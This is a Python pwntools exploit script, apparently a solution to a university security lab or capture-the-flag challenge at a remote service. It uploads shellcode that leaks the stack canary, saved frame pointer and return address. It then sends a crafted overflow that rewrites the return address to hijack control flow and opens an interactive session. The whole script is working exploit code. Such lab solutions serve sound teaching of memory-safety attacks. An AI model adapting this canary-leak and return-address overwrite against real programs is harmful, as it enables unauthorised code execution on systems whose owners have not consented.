#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import pow as pw
from pwn import *

context.arch = 'amd64'
context.os = 'linux'

exe = "./solver_sample" if len(sys.argv) < 2 else sys.argv[1]

payload = None
if os.path.exists(exe):
    with open(exe, 'rb') as f:
        payload = f.read()

# r = process("./remoteguess", shell=True)
#r = remote("localhost", 10816)
r = remote("up23.zoolab.org", 10816)

if type(r) != pwnlib.tubes.process.process:
    pw.solve_pow(r)

if payload != None:
    ef = ELF(exe)
    print("** {} bytes to submit, solver found at {:x}".format(len(payload), ef.symbols['solver']))
    r.sendlineafter(b'send to me? ', str(len(payload)).encode())
    r.sendlineafter(b'to call? ', str(ef.symbols['solver']).encode())
    r.sendafter(b'bytes): ', payload)

    r.recvuntil(b'canary      : ')
    canary = p64(int(r.recvuntil(b'\n', drop=True), 16))
    r.recvuntil(b'solver_rbp  : ')
    solver_rbp = p64(int(r.recvuntil(b'\n', drop=True), 16))
    r.recvuntil(b'return_addr : ')
    return_addr = p64(int(r.recvuntil(b'\n', drop=True), 16))

    print(canary, solver_rbp, return_addr)
    magic=0x11111111
    r.sendlineafter(b'answer? ', str(magic).ljust(24, " ").encode() + canary[0:8] + solver_rbp[0:8] + return_addr[0:8] + b'000000000000' + p32(magic))
    

else:
    my_asm = '''
        endbr64
        push   rbp
        mov    rbp, rsp
        mov    rax,QWORD PTR fs:0x28
        mov    QWORD PTR [rbp-0x8],rax
        xor    eax,eax
        mov    rdi, 1
        mov    rax, 1
        lea    rsi, [rbp-0x20]
        mov    edx, 0x80
        syscall 
    '''
    r.sendlineafter(b'send to me? ', str(len(asm(my_asm))).encode())
    r.sendlineafter(b'to call? ', str(0).encode())
    r.sendafter(b'bytes): ', asm(my_asm))

    r.recv()
    # r.recv(numb=5)
    # print("start here~")
    canary:int = 0
    rbp:int = 0
    return_addr:int = 0

    for i in range(6):
        tmp_recv = r.recv(numb=8)
        if i==3:
            canary = u64(tmp_recv)
        if i==4:
            rbp = u64(tmp_recv)
        if i==5:
            return_addr = u64(tmp_recv)
        # print(r.recv(numb=8).hex(), end='\n')
    # print(hex(canary))
    # print(hex(rbp))
    # print(hex(return_addr))
    return_addr += 0xab
    magic=0x11111111
    r.sendlineafter(b'answer? ', str(magic).ljust(24, " ").encode() + p64(canary)[0:8] + p64(rbp)[0:8] + p64(return_addr)[0:8] + b'000000000000' + p32(magic))

    # r.sendlineafter(b'answer? ', b'')

r.interactive()

# vim: set tabstop=4 expandtab shiftwidth=4 softtabstop=4 number cindent fileencoding=utf-8 :